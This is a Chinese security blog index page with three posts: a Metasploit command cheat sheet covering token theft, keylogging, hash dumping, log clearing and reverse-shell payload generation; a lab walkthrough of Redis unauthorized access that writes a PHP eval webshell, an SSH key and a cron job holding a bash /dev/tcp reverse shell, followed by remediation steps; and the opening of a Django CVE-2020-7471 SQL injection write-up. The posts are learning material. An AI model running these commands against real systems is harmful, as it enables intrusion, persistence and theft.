<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.cat.net/css?family=Lato:300,300italic,400,400italic,700,700italic|Fira Code:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"swanq.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="Try &amp; Enjoy">
<meta property="og:type" content="website">
<meta property="og:title" content="SwanQ&#39;s blog">
<meta property="og:url" content="http://swanq.top/index.html">
<meta property="og:site_name" content="SwanQ&#39;s blog">
<meta property="og:description" content="Try &amp; Enjoy">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="swanQ">
<meta property="article:tag" content="penetration, forensics, web, cyber security">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://swanq.top/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>SwanQ's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">SwanQ's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">有趣的是有道理且新奇，胡思乱想并不有趣。</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">12</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">3</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">8</span></a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

  <a href="https://github.com/swanQs" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/04/01/msf/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/01/msf/" class="post-title-link" itemprop="url">metasploit(MSF)初始化及常用命令</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-04-01 21:50:29 / 修改时间：22:07:36" itemprop="dateCreated datePublished" datetime="2021-04-01T21:50:29+08:00">2021-04-01</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><h1 id="0x02-初始化"><a href="#0x02-初始化" class="headerlink" title="0x02 初始化"></a>0x02 初始化</h1><p>Metasploit使用PostgreSQL作为数据库，所以先启动postgresql.<br>并初始化数据库<br>然后以root用户打开MSF<br><img src="/2021/04/01/msf/1.jpg"></p>
<h1 id="0x03-常用命令"><a href="#0x03-常用命令" class="headerlink" title="0x03 常用命令"></a>0x03 常用命令</h1><h2 id="metasploit命令"><a href="#metasploit命令" class="headerlink" title="metasploit命令"></a>metasploit命令</h2><ul>
<li>help<br>打开meterpreter使用帮助。</li>
<li>run scriptname<br>运行meterpreter脚本，在scripts/meterpreter目录下可查看到所有脚本名。</li>
<li>sysinfo<br>列出受控主机的系统信息。</li>
<li>ls<br>列出目标主机的文件和文件夹信息。</li>
<li>use priv<br>加载特权提升扩展模块，来扩展metasploit库。</li>
<li>ps<br>显示所有运行的进程以及相关联的用户账户。</li>
<li>migrate PID<br>迁移到一个指定的进程ID（PID号可通过ps命令从主机上获得）。</li>
<li>use incognito<br>加载incognito功能（用来盗窃目标主机的令牌或假冒用户）</li>
<li>list_tokens -u<br>列出目标主机用户的可用令牌。</li>
<li>list_tokens -g<br>列出目标主机用户组的可用令牌。</li>
<li>impersonate_token DOMAIN_NAME\USERNAME.<br>假冒目标主机上的可用令牌。</li>
<li>steal_token PID<br>盗窃给定进程的可用令牌并进行令牌假冒。</li>
<li>drop_token<br>停止假冒当前令牌。</li>
<li>getsystem<br>通过各种攻击向量来提升系统用户权限。</li>
<li>execute -f cmd.exe -i<br>执行cmd.exe命令并进行交互。</li>
<li>execute -f cmd.exe -i -t<br>以所有可用令牌来执行cmd命令并隐藏该进程。</li>
<li>rev2self<br>回到控制目标主机的初始用户账户下。</li>
<li>reg command<br>在目标主机注册表中进行交互，创建，删除，查询等操作。</li>
<li>setdesktop number<br>切换到另一个用户界面（该功能基于那些用户已登录）。</li>
<li>screenshot<br>对目标主机的屏幕进行截图。</li>
<li>upload file<br>向目标主机上传文件。</li>
<li>download file<br>从目标主机下载文件。</li>
<li>keyscan_start<br>针对远程目标主机开启键盘记录功能。</li>
<li>keyscan_dump<br>存储目标主机上捕获的键盘记录。</li>
<li>keyscan_stop<br>停止针对目标主机的键盘记录。</li>
<li>getprivs<br>尽可能多的获取目标主机上的特权。</li>
<li>uictl enable keyboard/mouse<br>接管目标主机的键盘和鼠标。</li>
<li>background<br>将你当前的metasploit shell转为后台执行。</li>
<li>hashdump<br>导出目标主机中的口令哈希值。</li>
<li>use sniffer<br>加载嗅探模式。</li>
<li>sniffer_interfaces<br>列出目标主机所有开放的网络端口。</li>
<li>sniffer_dump interfaceID pcapname<br>在目标主机上启动嗅探。</li>
<li>sniffer_start interfaceID packet-buffer<br>在目标主机上针对特定范围的数据包缓冲区启动嗅探。</li>
<li>sniffer_stats interfaceID<br>获取正在实施嗅探网络接口的统计数据。</li>
<li>sniffer_stop interfaceID<br>停止嗅探。</li>
<li>add_user username password -h ip<br>在远程目标主机上添加一个用户。</li>
<li>clearev<br>清楚目标主机上的日志记录。</li>
<li>timestomp<br>修改文件属性，例如修改文件的创建时间（反取证调查）。</li>
<li>reboot<br>重启目标主机。</li>
</ul>
<h2 id="msfpayload命令"><a href="#msfpayload命令" class="headerlink" title="msfpayload命令"></a>msfpayload命令</h2><ul>
<li>msfpayload -h<br>msfpayload的帮助信息。</li>
<li>msfpayload windows/meterpreter/bind_tcp O<br>列出所有windows/meterpreter/bind_tcp下可用的攻击载荷的配置项（任何攻击载荷都是可用配置的）。</li>
<li>msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT X &gt; payload.exe<br>创建一个metasploit的reverse_tcp攻击载荷，回连到LHOSTip的LPORT，将其保存为名为payload.exe的windows下可执行程序。</li>
<li>msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT R &gt; payload.raw<br>创建一个metasploit的reverse_tcp攻击载荷，回连到LHOSTip的LPORT，将其保存为名为payload.raw，该文件后面的msffencode中使用。</li>
<li>msfpayload windows/meterpreter/reverse_tcp LPORT=PORT C &gt; payload.c<br>创建一个metasploit的reverse_tcp攻击载荷，导出C格式的shellcode。</li>
<li>msfpayload windows/meterpreter/reverse_tcp LPORT=PORT J &gt; payload.java<br>创建一个metasploit的reverse_tcp攻击载荷，导出成以%u编码方式的javaScript语言字符串。</li>
</ul>
<h2 id="msfencode命令"><a href="#msfencode命令" class="headerlink" title="msfencode命令"></a>msfencode命令</h2><ul>
<li>mefencode -h<br>列出msfencode的帮助命令。</li>
<li>msfencode -l<br>列出所有可用的编码器。</li>
<li>msfencode -t (c,elf,exe,java,is_le,js_be,perl,raw,ruby,vba,vbs,loop_vbs,asp,war,macho)<br>显示编码缓冲区的格式。</li>
<li>msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c 5 -t exe<br>使用shikata_ga_nai编码器对payload.raw文件进行5编码，然后导出一个名为encoded_payload.exe的文件。</li>
<li>msfpayload windows/meterpreter/bind_tcp LPORT=PORT R | msfencode -e x86/_countdown -c 5 -t raw | msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded_payload.exe<br>创建一个经过多种编码格式嵌套编码的攻击载荷。</li>
<li>msfencode -i payload.raw BufferRegister=ESI -e x86/al破解a_mixed -t c<br>创建一个纯字母数字的shellcode，由ESI寄存器只想shellcode，以C格式输出。</li>
</ul>
<h2 id="MSFcli命令"><a href="#MSFcli命令" class="headerlink" title="MSFcli命令"></a>MSFcli命令</h2><ul>
<li>msfcli | grep exploit<br>仅列出渗透攻击模块。</li>
<li>msfcli | grep exploit/windows,<br>仅列出与windows相关的渗透攻击模块。</li>
<li>msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp LPORT=PORT RHOST=IP E<br>对IP发起ms08_067_netapi渗透攻击，配置了bind_tcp攻击载荷，并绑定在PORT端口进行监听。</li>
</ul>
<h2 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h2><ul>
<li>show exploits<br>列出metasploit框架中的所有渗透攻击模块。</li>
<li>show payloads<br>列出metasploit框架中的所有攻击载荷。</li>
<li>show auxiliary<br>列出metasploit框架中的所有辅助攻击载荷。</li>
<li>search name<br>查找metasploit框架中所有的渗透攻击和其他模块。</li>
<li>info<br>展示出制定渗透攻击或模块的相关信息。</li>
<li>use name<br>装载一个渗透攻击或模块。</li>
<li>LHOST<br>本地可以让目标主机连接的IP地址，通常当目标主机不在同一个局域网内时，就需要是一个公共IP地址，特别为反弹式shell使用。</li>
<li>RHOST<br>远程主机或是目标主机。</li>
<li>set function<br>设置特定的配置参数（EG：设置本地或远程主机参数）。</li>
<li>setg function<br>以全局方式设置特定的配置参数（EG：设置本地或远程主机参数）。</li>
<li>show options<br>列出某个渗透攻击或模块中所有的配置参数。</li>
<li>show targets<br>列出渗透攻击所有支持的目标平台。</li>
<li>set target num<br>指定你所知道的目标的操作系统以及补丁版本类型。</li>
<li>set payload name<br>指定想要使用的攻击载荷。</li>
<li>show advanced<br>列出所有高级配置选项。</li>
<li>set autorunscript migrate -f.<br>在渗透攻击完成后，将自动迁移到另一个进程。</li>
<li>check<br>检测目标是否选定渗透攻击存在相应的安全漏洞。</li>
<li>exploit<br>执行渗透攻击或模块来攻击目标。</li>
<li>exploit -j<br>在计划任务下进行渗透攻击（攻击将在后台进行）。</li>
<li>exploit -z<br>渗透攻击完成后不与回话进行交互。</li>
<li>exploit -e encoder<br>制定使用的攻击载荷编码方式（EG：exploit -e shikata_ga_nai）。</li>
<li>exploit -h<br>列出exploit命令的帮助信息。</li>
<li>sessions -l<br>列出可用的交互会话（在处理多个shell时使用）。</li>
<li>sessions -l -v<br>列出所有可用的交互会话以及详细信息，EG：攻击系统时使用了哪个安全漏洞。</li>
<li>sessions -s script<br>在所有活跃的metasploit会话中运行一个特定的metasploit脚本。</li>
<li>sessions -K<br>杀死所有活跃的交互会话。</li>
<li>sessions -c cmd<br>在所有活跃的metasploit会话上执行一个命令。</li>
<li>sessions -u sessionID<br>升级一个普通的win32 shell到metasploit shell。</li>
<li>db_create name<br>创建一个数据库驱动攻击所要使用的数据库（EG：db_create autopwn）。</li>
<li>db_connect name<br>创建并连接一个数据库驱动攻击所要使用的数据库（EG：db_connect user:passwd@ip/sqlname）。</li>
<li>db_namp<br>利用nmap并把扫描数据存储到数据库中（支持普通的nmap语句，EG：-sT -v -P0）。</li>
<li>db_autopwn -h<br>展示出db_autopwn命令的帮助信息。</li>
<li>db_autopwn -p -r -e<br>对所有发现的开放端口执行db_autopwn，攻击所有系统，并使用一个反弹式shell。<br>db_destroy<br>删除当前数据库。</li>
<li>db_destroy user：passwd@host：port/database<br>使用高级选项来删除数据库。</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/03/30/redis/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/30/redis/" class="post-title-link" itemprop="url">redis未授权访问总结</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-03-30 15:08:08 / 修改时间：20:47:19" itemprop="dateCreated datePublished" datetime="2021-03-30T15:08:08+08:00">2021-03-30</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>影响版本：3.2.9<br><img src="/2021/03/30/redis/2.jpg"></p>
<h2 id="0x02-getshell的三种方式"><a href="#0x02-getshell的三种方式" class="headerlink" title="0x02 getshell的三种方式"></a>0x02 getshell的三种方式</h2><ol>
<li>向web目录写入webshell</li>
<li>写入SSH公钥，获取系统权限</li>
<li>写crontab,写入定时任务</li>
</ol>
<h3 id="一、向web目录写入webshell"><a href="#一、向web目录写入webshell" class="headerlink" title="一、向web目录写入webshell"></a>一、向web目录写入webshell</h3><ol>
<li><p>测试环境<br>靶机(kali):192.168.127.130<br>攻击(Ubuntu):192.168.127.131</p>
</li>
<li><p>测试步骤<br>redis连接除了可指定IP，还可指定域名(替换即可)。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.127.130</span><br><span class="line">设置写入目录</span><br><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">设置写入文件</span><br><span class="line">config set dbfilename 1.php</span><br><span class="line">写入一句话木马</span><br><span class="line">set XXX &quot;\n\n\n&lt;?php @eval($_POST[&#39;cc&#39;]); ?&gt;\n\n\n&quot;</span><br><span class="line">保存写入硬盘 </span><br><span class="line">save</span><br></pre></td></tr></table></figure>
<p>得到webshell,用蚁剑连接即可</p>
</li>
<li><p>总结：</p>
</li>
</ol>
<ul>
<li>服务器必须有web服务</li>
<li>无须是root用户起的redis</li>
<li>无论是windows或linux都可用，但需知道网站的物理路径。Linux默认/var/www/html;Windows可能是D:/phpstudy_pro/www(config get dir判断是否是windows系统)。</li>
<li>无须flushall清空数据库<br>所以实际渗透过程中，此方法需要搭配phpinfo。先目录爆破获取各种探针文件，再从探针文件中获取相关路径信息、公网 IP 等，甚至从报错中尝试出物理路径信息（有些站的页面报错会直接暴露绝对路径）<h3 id="二、写入SSH公钥，获取系统权限"><a href="#二、写入SSH公钥，获取系统权限" class="headerlink" title="二、写入SSH公钥，获取系统权限"></a>二、写入SSH公钥，获取系统权限</h3>原理：redis未授权访问写authorized_keys强行拿到权限</li>
</ul>
<ol>
<li>测试环境<br>靶机(kali):192.168.127.130<br>攻击(Ubuntu):192.168.127.131</li>
<li>测试步骤<br>本地生成公私钥文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
将加换行的公钥写入test.txt，防止对数据库的其他内容造成影响。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ (echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; test.txt</span><br></pre></td></tr></table></figure>
清空数据<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.127.130 flushall</span><br></pre></td></tr></table></figure>
把公钥写入test这个key<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-x:代表从标准输入读取数据作为该命令的最后一个参数.set test test.txt</span><br><span class="line">cat test.txt | redis-cli -h 192.168.127.130 -x set test</span><br></pre></td></tr></table></figure>
连接靶机redis<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.127.130</span><br><span class="line">设置 rdb 文件存放的路径</span><br><span class="line">config set dir &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line"></span><br><span class="line">config get dir</span><br><span class="line">&quot;dir&quot;</span><br><span class="line">&quot;&#x2F;root&#x2F;.ssh&quot;</span><br><span class="line">设置 rdb 文件的文件名</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">保存到硬盘</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
将自己的公钥写入 /root/.ssh 文件夹中的 authotrized_keys ；<br>然后攻击者可直接执行ssh 192.168.127.130，输入生成公钥时填的key登录靶机<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.127.130</span><br></pre></td></tr></table></figure></li>
<li>总结：<br>漏洞利用前提：</li>
</ol>
<ul>
<li>redis运行在root用户下，否则还要猜测用户，即开启6379端口</li>
<li>此服务器对外开启了ssh服务。即开启22端口</li>
<li>不适用于windows<br>当我们获得了redis控制台，可以调用config set来更改dir和dbfilename，且不用重启redis服务就可以写入任意文件。</li>
</ul>
<h3 id="三、写入定时任务来执行命令-用于反弹shell"><a href="#三、写入定时任务来执行命令-用于反弹shell" class="headerlink" title="三、写入定时任务来执行命令   用于反弹shell"></a>三、写入定时任务来执行命令   用于反弹shell</h3><ol>
<li>测试环境<br>靶机(kali):192.168.127.130<br>攻击(Ubuntu):192.168.127.131<br>测试条件</li>
</ol>
<ul>
<li>靶机开启redis远程无密码访问</li>
<li>靶机redis对/var/spool/cron有写入权限<br>环境准备<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">关掉守护进程</span><br><span class="line">daemonize no</span><br><span class="line">关掉保护模式</span><br><span class="line">protected-mode no</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="2">
<li>测试步骤</li>
</ol>
<p>利用redis以root权限运行时，写cron</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">设置写 crontabs 的文件夹路径</span><br><span class="line">config set dir &quot;&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&quot;</span><br><span class="line">修改备份文件名为root</span><br><span class="line">config set dbfilename root</span><br></pre></td></tr></table></figure>
<p>生成文件root文件，之后redis所有数据都会保存在/var/spool/cron/crontabs/root文件中。而这个文件就是root用户的定时任务配置文件。系统会执行该文件定义的定时任务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">对 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root 写入「反弹 shell」的计划任务</span><br><span class="line">echo -e &quot;\n\n\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.127.130&#x2F;9999 0&gt;&amp;1\n\n\n&quot;|redis-cli -x set %</span><br><span class="line">保存数据</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
<p>监听指定端口，接收反弹shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 9999</span><br></pre></td></tr></table></figure>
<p>查看定时任务是否生效：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -f vim &#x2F;var&#x2F;log&#x2F;cron</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root目录下生成了hello.outtest文件，且文件内容定时更新</span><br><span class="line">ll &#x2F;root&#x2F;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>总结</li>
</ol>
<ul>
<li>无须flushall清空数据，redis-cli set 1 ‘ringzero’ 这样的语法可以控制第一条记录，就能保证你的内容始终保持在最前面。</li>
<li>需要root起的redis</li>
<li>不适用于windows,windows下无计划任务</li>
</ul>
<h2 id="0x03-漏洞危害"><a href="#0x03-漏洞危害" class="headerlink" title="0x03 漏洞危害"></a>0x03 漏洞危害</h2><p>用root登陆redis后，可以更改redis的持久化目录。<br>可以修改系统中任意文件，并写入内容</p>
<h2 id="0x04-修复漏洞"><a href="#0x04-修复漏洞" class="headerlink" title="0x04 修复漏洞"></a>0x04 修复漏洞</h2><p>关闭安全组redis端口，或给予最小访问规则<br>修改redis配置文件：</p>
<ol>
<li>网络层指定redis使用的网卡</li>
<li>设置防火墙策略</li>
<li>设置访问密码</li>
</ol>
<p>日常维护:</p>
<ol>
<li>查看定时任务的/etc/crontab 和var/var/spool/cron等文件是否有异常的内容写入</li>
<li>查看用户登录秘钥是否有异常写入。（对方可以免密登录你的系统）</li>
<li>查看系统登录日志，查看是否有异常登录</li>
<li>其他你发现有可能影响的文件<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><a target="_blank" rel="noopener" href="http://blog.leanote.com/post/snowming/2d9a2082c02b">http://blog.leanote.com/post/snowming/2d9a2082c02b</a><br><a target="_blank" rel="noopener" href="https://help.aliyun.com/knowledge_detail/37447.html">https://help.aliyun.com/knowledge_detail/37447.html</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/kouryoushine/article/details/87917762">https://blog.csdn.net/kouryoushine/article/details/87917762</a><br><a target="_blank" rel="noopener" href="https://my.oschina.net/u/4587690/blog/4669956">https://my.oschina.net/u/4587690/blog/4669956</a><br><a target="_blank" rel="noopener" href="https://sec.thief.one/article_content?a_id=26075edf17193404345b388f26ffbc26">https://sec.thief.one/article_content?a_id=26075edf17193404345b388f26ffbc26</a></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/03/29/Django-sql/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/29/Django-sql/" class="post-title-link" itemprop="url">Django-sql注入漏洞复现-CVE-2020-7471</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-03-29 19:53:21" itemprop="dateCreated datePublished" datetime="2021-03-29T19:53:21+08:00">2021-03-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-04-03 21:42:25" itemprop="dateModified" datetime="2021-04-03T21:42:25+08:00">2021-04-03</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>Django作为开放源码的Web应用python框架，作为最有代表性的web框架，构建了多种网站和APP。Django负责处理网站开发中麻烦的部分，因此让开发者专注于应用程序的编写。其采用了MVT的软件设计模式，即模型（Model），视图（View）和模板（Template），注重组件的重用性和“可插拔性”。<br><strong>原理</strong><br>通过构造分隔符，传递给聚合函数contrib.postgres.aggregates.StringAgg，从而绕过转义符号（\）来注入恶意SQL语句。<br>漏洞的核心是StringAgg(delimiter),StringAgg聚合函数的delimiter参数存在SQL注入漏洞。</p>
<p>介绍下StringAgg，它会将输入的值使用 delimiter 分隔符级联起来。比如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Info.objects.all().values(&#39;gender&#39;).annotate(mydefinedname&#x3D;StringAgg(&#39;name&#39;, delimiter&#x3D;&quot;-&quot;))</span><br></pre></td></tr></table></figure>

